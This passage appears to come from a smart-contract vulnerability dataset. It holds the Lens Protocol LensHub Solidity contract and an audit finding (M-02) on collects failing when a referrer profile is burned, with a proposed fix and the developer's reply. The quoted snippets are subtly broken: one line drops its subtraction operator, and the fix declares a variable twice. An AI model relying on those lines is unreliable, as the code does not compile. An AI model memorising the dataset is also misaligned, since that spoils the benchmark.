_clearHandleHash(tokenId);\n    }\n\n    /// ***************************************\n    /// *****PROFILE INTERACTION FUNCTIONS*****\n    /// ***************************************\n\n    /// @inheritdoc ILensHub\n    function follow(uint256[] calldata profileIds, bytes[] calldata datas)\n        external\n        override\n        whenNotPaused\n    {\n        InteractionLogic.follow(\n            msg.sender,\n            profileIds,\n            datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function followWithSig(DataTypes.FollowWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32[] memory dataHashes = new bytes32[](vars.datas.length);\n        for (uint256 i = 0; i < vars.datas.length; ++i) {\n            dataHashes[i] = keccak256(vars.datas[i]);\n        }\n\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            FOLLOW_WITH_SIG_TYPEHASH,\n                            keccak256(abi.encodePacked(vars.profileIds)),\n                            keccak256(abi.encodePacked(dataHashes)),\n                            sigNonces[vars.follower]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.follower, vars.sig);\n        InteractionLogic.follow(\n            vars.follower,\n            vars.profileIds,\n            vars.datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collect(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override whenNotPaused {\n        InteractionLogic.collect(\n            msg.sender,\n            profileId,\n            pubId,\n            data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collectWithSig(DataTypes.CollectWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COLLECT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.pubId,\n                            keccak256(vars.data),\n                            sigNonces[vars.collector]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.collector, vars.sig);\n        InteractionLogic.collect(\n            vars.collector,\n            vars.profileId,\n            vars.pubId,\n            vars.data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function emitFollowNFTTransferEvent(\n        uint256 profileId,\n        uint256 followNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedFollowNFT = _profileById[profileId].followNFT;\n        if (msg.sender != expectedFollowNFT) revert Errors.CallerNotFollowNFT();\n        emit Events.FollowNFTTransferred(profileId, followNFTId, from, to, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function emitCollectNFTTransferEvent(\n        uint256 profileId,\n        uint256 pubId,\n        uint256 collectNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedCollectNFT = _pubByIdByProfile[profileId][pubId].collectNFT;\n        if (msg.sender != expectedCollectNFT) revert Errors.CallerNotCollectNFT();\n        emit Events.CollectNFTTransferred(\n            profileId,\n            pubId,\n            collectNFTId,\n            from,\n            to,\n            block.timestamp\n        );\n    }\n\n    /// *********************************\n    /// *****EXTERNAL VIEW FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function isProfileCreatorWhitelisted(address profileCreator)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _profileCreatorWhitelisted[profileCreator];\n    }\n\n    /// @inheritdoc ILensHub\n    function isFollowModuleWhitelisted(address followModule) external view override returns (bool) {\n        return _followModuleWhitelisted[followModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isReferenceModuleWhitelisted(address referenceModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _referenceModuleWhitelisted[referenceModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isCollectModuleWhitelisted(address collectModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _collectModuleWhitelisted[collectModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function getGovernance() external view override returns (address) {\n        return _governance;\n    }\n\n    /// @inheritdoc ILensHub\n    function getDispatcher(uint256 profileId) external view override returns (address) {\n        return _dispatcherByProfile[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubCount(uint256 profileId) external view override returns (uint256) {\n        return _profileById[profileId].pubCount;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFT(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFTURI(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].followNFTURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectNFT(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowModule(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getReferenceModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].referenceModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getHandle(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].handle;\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubPointer(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        uint256 profileIdPointed = _pubByIdByProfile[profileId][pubId].profileIdPointed;\n        uint256 pubIdPointed = _pubByIdByProfile[profileId][pubId].pubIdPointed;\n        return (profileIdPointed, pubIdPointed);\n    }\n\n    /// @inheritdoc ILensHub\n    function getContentURI(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (string memory)\n    {\n        (uint256 rootProfileId, uint256 rootPubId, ) = Helpers.getPointedIfMirror(\n            profileId,\n            pubId,\n            _pubByIdByProfile\n        );\n        return _pubByIdByProfile[rootProfileId][rootPubId].contentURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n        bytes32 handleHash = keccak256(bytes(handle));\n        return _profileIdByHandleHash[handleHash];\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfile(uint256 profileId)\n        external\n        view\n        override\n        returns (DataTypes.ProfileStruct memory)\n    {\n        return _profileById[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPub(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PublicationStruct memory)\n    {\n        return _pubByIdByProfile[profileId][pubId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubType(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PubType)\n    {\n        if (pubId == 0 || _profileById[profileId].pubCount < pubId) {\n            return DataTypes.PubType.Nonexistent;\n        } else if (_pubByIdByProfile[profileId][pubId].collectModule == address(0)) {\n            return DataTypes.PubType.Mirror;\n        } else {\n            if (_pubByIdByProfile[profileId][pubId].profileIdPointed == 0) {\n                return DataTypes.PubType.Post;\n            } else {\n                return DataTypes.PubType.Comment;\n            }\n        }\n    }\n\n    /**\n     * @dev Overrides the ERC721 tokenURI function to return the associated URI with a given profile.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return _profileById[tokenId].imageURI; // temp\n    }\n\n    /// ****************************\n    /// *****INTERNAL FUNCTIONS*****\n    /// ****************************\n\n    function _setGovernance(address newGovernance) internal {\n        address prevGovernance = _governance;\n        _governance = newGovernance;\n        emit Events.GovernanceSet(msg.sender, prevGovernance, newGovernance, block.timestamp);\n    }\n\n    function _createPost(\n        uint256 profileId,\n        string memory contentURI,\n        address collectModule,\n        bytes memory collectModuleData,\n        address referenceModule,\n        bytes memory referenceModuleData\n    ) internal {\n        PublishingLogic.createPost(\n            profileId,\n            contentURI,\n            collectModule,\n            collectModuleData,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n    function _createMirror(\n        uint256 profileId,\n        uint256 profileIdPointed,\n        uint256 pubIdPointed,\n        address referenceModule,\n        bytes calldata referenceModuleData\n    ) internal {\n        PublishingLogic.createMirror(\n            profileId,\n            profileIdPointed,\n            pubIdPointed,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _setDispatcher(uint256 profileId, address dispatcher) internal {\n        _dispatcherByProfile[profileId] = dispatcher;\n        emit Events.DispatcherSet(profileId, dispatcher, block.timestamp);\n    }\n\n    function _setProfileImageURI(uint256 profileId, string memory imageURI) internal {\n        _profileById[profileId].imageURI = imageURI;\n        emit Events.ProfileImageURISet(profileId, imageURI, block.timestamp);\n    }\n\n    function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal {\n        _profileById[profileId].followNFTURI = followNFTURI;\n        emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    }\n\n    function _clearHandleHash(uint256 profileId) internal {\n        bytes32 handleHash = keccak256(bytes(_profileById[profileId].handle));\n        _profileIdByHandleHash[handleHash] = 0;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        if (_dispatcherByProfile[tokenId] != address(0)) {\n            _setDispatcher(tokenId, address(0));\n        }\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId])\n            revert Errors.NotProfileOwnerOrDispatcher();\n    }\n\n    function _validateCallerIsProfileOwner(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId)) revert Errors.NotProfileOwner();\n    }\n\n    function _validateCallerIsGovernance() internal view {\n        if (msg.sender != _governance) revert Errors.NotGovernance();\n    }\n\n    function _validateCallerIsWhitelistedProfileCreator() internal view {\n        if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n    }\n\n    function getRevision() internal pure virtual override returns (uint256) {\n        return REVISION;\n    }\n}\n\n\n",
        "CodeNames": [
            "FollowNFT.sol",
            "EmptyCollectModule.sol",
            "FeeCollectModule.sol",
            "LensHub.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-02",
                "Location": [
                    "//solidity\nif (referralFee != 0) {\n    // The reason we levy the referral fee on the adjusted amount is so that referral fees\n    // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n}\n"
                ],
                "Type": " Inappropriate handling of  referralFee  makes collecting Mirror fails without error when  referrerProfileId  is burned",
                "Description": "\nIn the current implementation, even when the profile's owner burnt the ProfileNFT, as the profile's legacy, the publications can still be collected.\n\nHowever, if the publication is a Mirror and there is a referralFee set by the original publication, the user won't be able to collect from a Mirror that was published by a burned profile.\n\nFeeCollectModule.sol#L163-L172(https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L163-L172)<br\n\nsolidity\nif (referralFee != 0) {\n    // The reason we levy the referral fee on the adjusted amount is so that referral fees\n    // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n}\n\n\n When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher's profile ID is passed as a \"referrer.\"\n\nIn _processCollectWithReferral(), if there is a referralFee, contract will read referralRecipient from IERC721(HUB).ownerOf(referrerProfileId), if referrerProfileId is burned, the IERC721(HUB).ownerOf(referrerProfileId) will revert with ERC721: owner query for nonexistent token.\n\nHowever, since we wish to allow the content to be collected, we should just treat referrals as non-existent in this situation.\n\n",
                "Repair": "\nChange to:\n\nsolidity\ntry IERC721(HUB).ownerOf(referrerProfileId) returns (address referralRecipient) {\n    uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n    adjustedAmount = adjustedAmount referralAmount;\n\n    address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n    IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n} catch {\n    emit LogNonExistingReferrer(referrerProfileId);\n}\n\n\nZer0dot (Aave Lens) acknowledged and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67#issuecomment-1074520332):\n  This is valid! However, this is only an issue when a profile is deleted (burned), in which case UIs have multiple choices:\n \n     1. Stop displaying all the burnt profile's publications\n     2. Redirect users, when collecting mirrors, to the original publication\n     3. Prevent all collects\n \n I don't think this adds any risk to the protocol and although it's valid, we will not be taking any action.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {Helpers} from '../libraries/Helpers.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {PublishingLogic} from '../libraries/PublishingLogic.sol';\nimport {InteractionLogic} from '../libraries/InteractionLogic.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {LensMultiState} from './base/LensMultiState.sol';\nimport {LensHubStorage} from './storage/LensHubStorage.sol';\nimport {VersionedInitializable} from '../upgradeability/VersionedInitializable.sol';\n\n/**\n * @title LensHub\n * @author Lens Protocol\n *\n * @notice This is the main entrypoint of the Lens Protocol. It contains governance functionality as well as\n * publishing and profile interaction functionality.\n *\n * NOTE: The Lens Protocol is unique in that frontend operators need to track a potentially overwhelming\n * number of NFT contracts and interactions at once. For that reason, we've made two quirky design decisions:\n *      1. Both Follow & Collect NFTs invoke an LensHub callback on transfer with the sole purpose of emitting an event.\n *      2. Almost every event in the protocol emits the current block timestamp, reducing the need to fetch it manually.\n */\ncontract LensHub is ILensHub, LensNFTBase, VersionedInitializable, LensMultiState, LensHubStorage {\n    uint256 internal constant REVISION = 1;\n\n    address internal immutable FOLLOW_NFT_IMPL;\n    address internal immutable COLLECT_NFT_IMPL;\n\n    /**\n     * @dev This modifier reverts if the caller is not the configured governance address.\n     */\n    modifier onlyGov() {\n        _validateCallerIsGovernance();\n        _;\n    }\n\n    /**\n     * @dev This modifier reverts if the caller is not a whitelisted profile creator address.\n     */\n    modifier onlyWhitelistedProfileCreator() {\n        _validateCallerIsWhitelistedProfileCreator();\n        _;\n    }\n\n    /**\n     * @dev The constructor sets the immutable follow & collect NFT implementations.\n     *\n     * @param followNFTImpl The follow NFT implementation address.\n     * @param collectNFTImpl The collect NFT implementation address.\n     */\n    constructor(address followNFTImpl, address collectNFTImpl) {\n        FOLLOW_NFT_IMPL = followNFTImpl;\n        COLLECT_NFT_IMPL = collectNFTImpl;\n    }\n\n    /// @inheritdoc ILensHub\n    function initialize(\n        string calldata name,\n        string calldata symbol,\n        address newGovernance\n    ) external override initializer {\n        super._initialize(name, symbol);\n        _setState(DataTypes.ProtocolState.Paused);\n        _setGovernance(newGovernance);\n    }\n\n    /// ***********************\n    /// *****GOV FUNCTIONS*****\n    /// ***********************\n\n    /// @inheritdoc ILensHub\n    function setGovernance(address newGovernance) external override onlyGov {\n        _setGovernance(newGovernance);\n    }\n\n    /// @inheritdoc ILensHub\n    function setEmergencyAdmin(address newEmergencyAdmin) external override onlyGov {\n        address prevEmergencyAdmin = _emergencyAdmin;\n        _emergencyAdmin = newEmergencyAdmin;\n        emit Events.EmergencyAdminSet(\n            msg.sender,\n            prevEmergencyAdmin,\n            newEmergencyAdmin,\n            block.timestamp\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setState(DataTypes.ProtocolState newState) external override {\n        if (msg.sender != _governance && msg.sender != _emergencyAdmin)\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        _setState(newState);\n    }\n\n    ///@inheritdoc ILensHub\n    function whitelistProfileCreator(address profileCreator, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _profileCreatorWhitelisted[profileCreator] = whitelist;\n        emit Events.ProfileCreatorWhitelisted(profileCreator, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistFollowModule(address followModule, bool whitelist) external override onlyGov {\n        _followModuleWhitelisted[followModule] = whitelist;\n        emit Events.FollowModuleWhitelisted(followModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistReferenceModule(address referenceModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _referenceModuleWhitelisted[referenceModule] = whitelist;\n        emit Events.ReferenceModuleWhitelisted(referenceModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistCollectModule(address collectModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _collectModuleWhitelisted[collectModule] = whitelist;\n        emit Events.CollectModuleWhitelisted(collectModule, whitelist, block.timestamp);\n    }\n\n    /// *********************************\n    /// *****PROFILE OWNER FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function createProfile(DataTypes.CreateProfileData calldata vars)\n        external\n        override\n        whenNotPaused\n        onlyWhitelistedProfileCreator\n    {\n        uint256 profileId = ++_profileCounter;\n        _mint(vars.to, profileId);\n        PublishingLogic.createProfile(\n            vars,\n            profileId,\n            _profileIdByHandleHash,\n            _profileById,\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModule(\n        uint256 profileId,\n        address followModule,\n        bytes calldata followModuleData\n    ) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        PublishingLogic.setFollowModule(\n            profileId,\n            followModule,\n            followModuleData,\n            _profileById[profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModuleWithSig(DataTypes.SetFollowModuleWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_MODULE_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.followModule,\n                            keccak256(vars.followModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        PublishingLogic.setFollowModule(\n            vars.profileId,\n            vars.followModule,\n            vars.followModuleData,\n            _profileById[vars.profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcher(uint256 profileId, address dispatcher) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        _setDispatcher(profileId, dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcherWithSig(DataTypes.SetDispatcherWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_DISPATCHER_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.dispatcher,\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setDispatcher(vars.profileId, vars.dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURI(uint256 profileId, string calldata imageURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setProfileImageURI(profileId, imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURIWithSig(DataTypes.SetProfileImageURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_PROFILE_IMAGE_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.imageURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setProfileImageURI(vars.profileId, vars.imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURI(uint256 profileId, string calldata followNFTURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setFollowNFTURI(profileId, followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_NFT_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.followNFTURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setFollowNFTURI(vars.profileId, vars.followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function postWithSig(DataTypes.PostWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            POST_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function comment(DataTypes.CommentData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createComment(vars);\n    }\n\n    /// @inheritdoc ILensHub\n    function commentWithSig(DataTypes.CommentWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COMMENT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createComment(\n            DataTypes.CommentData(\n                vars.profileId,\n                vars.contentURI,\n                vars.profileIdPointed,\n                vars.pubIdPointed,\n                vars.collectModule,\n                vars.collectModuleData,\n                vars.referenceModule,\n                vars.referenceModuleData\n            )\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirror(DataTypes.MirrorData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirrorWithSig(DataTypes.MirrorWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            MIRROR_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /**\n     * @notice Burns a profile, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burn()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burn(uint256 tokenId) public override whenNotPaused {\n        super.burn(tokenId);\n        _clearHandleHash(tokenId);\n    }\n\n    /**\n     * @notice Burns a profile with a signature, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burnWithSig()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig)\n        public\n        override\n        whenNotPaused\n    {\n        super.burnWithSig(tokenId, sig);\n        _clearHandleHash(tokenId);\n    }\n\n    /// ***************************************\n    /// *****PROFILE INTERACTION FUNCTIONS*****\n    /// ***************************************\n\n    /// @inheritdoc ILensHub\n    function follow(uint256[] calldata profileIds, bytes[] calldata datas)\n        external\n        override\n        whenNotPaused\n    {\n        InteractionLogic.follow(\n            msg.sender,\n            profileIds,\n            datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function followWithSig(DataTypes.FollowWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32[] memory dataHashes = new bytes32[](vars.datas.length);\n        for (uint256 i = 0; i < vars.datas.length; ++i) {\n            dataHashes[i] = keccak256(vars.datas[i]);\n        }\n\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            FOLLOW_WITH_SIG_TYPEHASH,\n                            keccak256(abi.encodePacked(vars.profileIds)),\n                            keccak256(abi.encodePacked(dataHashes)),\n                            sigNonces[vars.follower]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.follower, vars.sig);\n        InteractionLogic.follow(\n            vars.follower,\n            vars.profileIds,\n            vars.datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collect(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override whenNotPaused {\n        InteractionLogic.collect(\n            msg.sender,\n            profileId,\n            pubId,\n            data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collectWithSig(DataTypes.CollectWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COLLECT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            